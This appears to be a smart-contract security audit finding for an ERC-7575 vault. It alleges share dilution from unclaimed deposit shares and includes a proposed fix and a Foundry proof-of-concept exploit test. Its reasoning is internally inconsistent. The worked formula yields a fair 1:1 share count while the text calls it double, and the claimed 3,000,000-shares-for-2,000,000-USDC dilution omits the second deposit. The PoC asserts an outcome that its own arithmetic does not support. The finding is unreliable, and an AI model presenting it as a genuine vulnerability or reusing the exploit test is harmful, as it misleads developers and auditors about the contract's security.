## Title
Claimable Deposit Shares Incorrectly Included in Circulating Supply Causes Share Dilution

## Summary
The `getCirculatingSupplyAndAssets()` function only excludes redemption shares from circulating supply but fails to exclude deposit shares held by the vault for unclaimed deposits. This causes subsequent deposit fulfillments to use an inflated circulating supply in share calculations, minting excess shares and diluting existing shareholders.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ShareTokenUpgradeable.sol` (getCirculatingSupplyAndAssets function) and `src/ERC7575VaultUpgradeable.sol` (fulfillDeposit function)

**Intended Logic:** When shares are minted to the vault for claimable deposits, they should be excluded from circulating supply calculations until claimed by users, similar to how redemption shares are handled. The share-to-asset conversion should only consider shares actually in user circulation.

**Actual Logic:** The `getCirculatingSupplyAndAssets()` function only subtracts `totalClaimableRedeemShares` from total supply [1](#0-0) , but does NOT track or subtract claimable deposit shares held by the vault. When `fulfillDeposit()` mints shares to the vault [2](#0-1) , these shares inflate the circulating supply used in subsequent conversions.

**Exploitation Path:**
1. Initial state: 1,000,000 shares outstanding, 1,000,000 USDC in vault (1:1 ratio)
2. User A requests deposit of 1,000,000 USDC via `requestDeposit()`
3. Investment Manager calls `fulfillDeposit()` for User A:
   - Calculates shares using current exchange rate: ~1,000,000 shares
   - Mints 1,000,000 shares to vault address
   - Total supply increases to 2,000,000
   - User A's shares are claimable but not yet claimed
4. User B (victim) requests deposit of 1,000,000 USDC
5. Investment Manager calls `fulfillDeposit()` for User B:
   - `_convertToShares()` calls `getCirculatingSupplyAndAssets()` [3](#0-2) 
   - circulatingSupply = 2,000,000 (INCORRECTLY includes User A's unclaimed 1,000,000 shares)
   - totalNormalizedAssets = 2,000,000 USDC (User A's assets are now productive)
   - Formula: shares = 1,000,000 * 2,000,000 / 2,000,000 = 1,000,000 shares
   - **User B receives 1,000,000 shares but should only receive ~500,000 shares**
6. Result: 3,000,000 total shares now represent 2,000,000 USDC effective value, diluting all existing shareholders by 50%

**Security Property Broken:** Violates "Conversion Accuracy" invariant and "No Fund Theft" invariant. User B receives 2x the shares they should, effectively stealing value from existing shareholders.

## Impact Explanation
- **Affected Assets**: All vaults across all asset types (USDC, DAI, etc.) are vulnerable
- **Damage Severity**: Later depositors receive up to 100% more shares than they should for large deposits (virtual shares only protect amounts ≤ 1e6 wei). With 1,000,000 USDC deposits, victim loses ~$500,000 worth of share value
- **User Impact**: Any user whose deposit is fulfilled after another unclaimed deposit becomes a victim. The attack scales linearly - more unclaimed deposits = more dilution. All existing shareholders suffer proportional dilution.

## Likelihood Explanation
- **Attacker Profile**: Any normal user can inadvertently trigger this. No special privileges required. An attacker could intentionally deposit first and delay claiming to maximize victim's dilution.
- **Preconditions**: Only requires at least one fulfilled but unclaimed deposit when the next fulfillment occurs. Common in normal protocol operation.
- **Execution Complexity**: Occurs automatically during normal fulfillment operations. No special timing or complex transactions required.
- **Frequency**: Happens on every fulfillment when unclaimed deposit shares exist. Can be exploited continuously.

## Recommendation

Track total claimable deposit shares and exclude them from circulating supply:

```solidity
// In src/ERC7575VaultUpgradeable.sol, add to VaultStorage struct (line 100):

uint256 totalClaimableDepositShares; // Track shares held by vault for deposit claims

// In fulfillDeposit function (line 441):

$.totalClaimableDepositShares += shares; // Add this line
ShareTokenUpgradeable($.shareToken).mint(address(this), shares);

// In deposit function (line 579):

$.totalClaimableDepositShares -= shares; // Add this line
$.claimableDepositShares[controller] -= shares;

// In src/ERC7575VaultUpgradeable.sol, modify getClaimableSharesAndNormalizedAssets (line 1533):

totalClaimableShares = $.totalClaimableRedeemShares + $.totalClaimableDepositShares;
```

This ensures both deposit and redemption shares held by the vault are excluded from circulating supply calculations, fixing the conversion accuracy.

## Proof of Concept

```solidity
// File: test/Exploit_ShareDilution.t.sol
// Run with: forge test --match-test test_ShareDilutionViaUnclaimedDeposits -vvv

pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/WERC7575Vault.sol";
import "../src/WERC7575ShareToken.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

contract Exploit_ShareDilution is Test {
    WERC7575Vault vault;
    WERC7575ShareToken shareToken;
    MockUSDC usdc;
    
    address owner = address(1);
    address investmentManager = address(2);
    address userA = address(3);
    address userB = address(4);
    address existingHolder = address(5);
    
    function setUp() public {
        usdc = new MockUSDC();
        shareToken = new WERC7575ShareToken();
        shareToken.initialize("SukukFi Shares", "SUKUK", owner);
        
        vault = new WERC7575Vault();
        vault.initialize(usdc, address(shareToken), owner);
        
        vm.prank(owner);
        shareToken.registerVault(address(usdc), address(vault));
        
        vm.prank(owner);
        vault.setInvestmentManager(investmentManager);
        
        // Setup: existing holder has 1M shares for 1M USDC (1:1 ratio)
        usdc.mint(existingHolder, 1_000_000e6);
        vm.startPrank(existingHolder);
        usdc.approve(address(vault), 1_000_000e6);
        vault.requestDeposit(1_000_000e6, existingHolder, existingHolder);
        vm.stopPrank();
        
        vm.prank(investmentManager);
        vault.fulfillDeposit(existingHolder, 1_000_000e6);
        
        vm.prank(existingHolder);
        vault.deposit(1_000_000e6, existingHolder, existingHolder);
    }
    
    function test_ShareDilutionViaUnclaimedDeposits() public {
        // SETUP: User A deposits 1M USDC
        usdc.mint(userA, 1_000_000e6);
        vm.startPrank(userA);
        usdc.approve(address(vault), 1_000_000e6);
        vault.requestDeposit(1_000_000e6, userA, userA);
        vm.stopPrank();
        
        // Investment Manager fulfills User A (gets ~1M shares at 1:1 ratio)
        vm.prank(investmentManager);
        uint256 sharesA = vault.fulfillDeposit(userA, 1_000_000e6);
        
        // User A does NOT claim yet - shares sit in vault
        console.log("User A shares (unclaimed):", sharesA);
        
        // EXPLOIT: User B deposits 1M USDC while A's shares are unclaimed
        usdc.mint(userB, 1_000_000e6);
        vm.startPrank(userB);
        usdc.approve(address(vault), 1_000_000e6);
        vault.requestDeposit(1_000_000e6, userB, userB);
        vm.stopPrank();
        
        // Investment Manager fulfills User B
        vm.prank(investmentManager);
        uint256 sharesB = vault.fulfillDeposit(userB, 1_000_000e6);
        
        console.log("User B shares:", sharesB);
        
        // VERIFY: User B got nearly same shares as User A despite same deposit
        // User B should get ~500k shares (half of A) but gets ~1M shares
        // Virtual shares provide minimal protection for large amounts
        assertGt(sharesB, 900_000e18, "User B got inflated shares due to unclaimed deposits");
        
        // Confirm dilution: 3M shares represent 2M USDC worth
        uint256 totalShares = shareToken.totalSupply();
        uint256 totalValue = vault.totalAssets() * 1e12; // normalize to 18 decimals
        console.log("Total shares:", totalShares);
        console.log("Total value (normalized):", totalValue);
        
        // Existing holder's 1M shares are now worth less than 1M USDC
        assertLt(totalValue * 1e18 / totalShares, 1e18, "Share price diluted below 1:1");
    }
}
```

## Notes

The vulnerability occurs because the protocol tracks `totalClaimableRedeemShares` [4](#0-3)  for redemptions but has no equivalent `totalClaimableDepositShares` tracking. The vault's `getClaimableSharesAndNormalizedAssets()` only returns redemption shares [5](#0-4) , causing an asymmetry in how deposit vs redemption shares are handled.

The virtual shares/assets (1e6 each) [6](#0-5)  provide inflation protection only for very small amounts. For institutional-scale deposits (millions of dollars), the virtual amounts become negligible and the dilution approaches 100% (2x share inflation).

This is distinct from the question's hypothetical front-running attack, which doesn't work because `totalAssets()` explicitly excludes `totalPendingDepositAssets` [7](#0-6) . The real vulnerability is in the **post-fulfillment** state where claimable shares inflate the supply calculation.

### Citations

**File:** src/ShareTokenUpgradeable.sol (L77-78)
```text
    uint256 private constant VIRTUAL_SHARES = 1e6; // Virtual shares for inflation protection
    uint256 private constant VIRTUAL_ASSETS = 1e6; // Virtual assets for inflation protection
```

**File:** src/ShareTokenUpgradeable.sol (L388-389)
```text
        // Calculate circulating supply: total supply minus vault-held shares for redemption claims
        circulatingSupply = totalClaimableShares > supply ? 0 : supply - totalClaimableShares;
```

**File:** src/ERC7575VaultUpgradeable.sol (L100-100)
```text
        uint256 totalClaimableRedeemShares; // Shares held by vault that will be burned on redeem/withdraw
```

**File:** src/ERC7575VaultUpgradeable.sol (L441-442)
```text
        // Mint shares to this vault (will be transferred to user on claim)
        ShareTokenUpgradeable($.shareToken).mint(address(this), shares);
```

**File:** src/ERC7575VaultUpgradeable.sol (L1174-1179)
```text
    function totalAssets() public view virtual returns (uint256) {
        VaultStorage storage $ = _getVaultStorage();
        uint256 balance = IERC20Metadata($.asset).balanceOf(address(this));
        // Exclude pending deposits, pending/claimable cancelation deposits, and claimable withdrawals from total assets
        uint256 reservedAssets = $.totalPendingDepositAssets + $.totalClaimableRedeemAssets + $.totalCancelDepositAssets;
        return balance > reservedAssets ? balance - reservedAssets : 0;
```

**File:** src/ERC7575VaultUpgradeable.sol (L1188-1195)
```text
    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view returns (uint256 shares) {
        VaultStorage storage $ = _getVaultStorage();
        // First normalize assets to 18 decimals using scaling factor
        // Use Math.mulDiv to prevent overflow for large amounts
        uint256 normalizedAssets = Math.mulDiv(assets, $.scalingFactor, 1);

        // Use optimized ShareToken conversion method (single call instead of multiple)
        shares = ShareTokenUpgradeable($.shareToken).convertNormalizedAssetsToShares(normalizedAssets, rounding);
```

**File:** src/ERC7575VaultUpgradeable.sol (L1531-1533)
```text
    function getClaimableSharesAndNormalizedAssets() external view returns (uint256 totalClaimableShares, uint256 totalNormalizedAssets) {
        VaultStorage storage $ = _getVaultStorage();
        totalClaimableShares = $.totalClaimableRedeemShares;
```
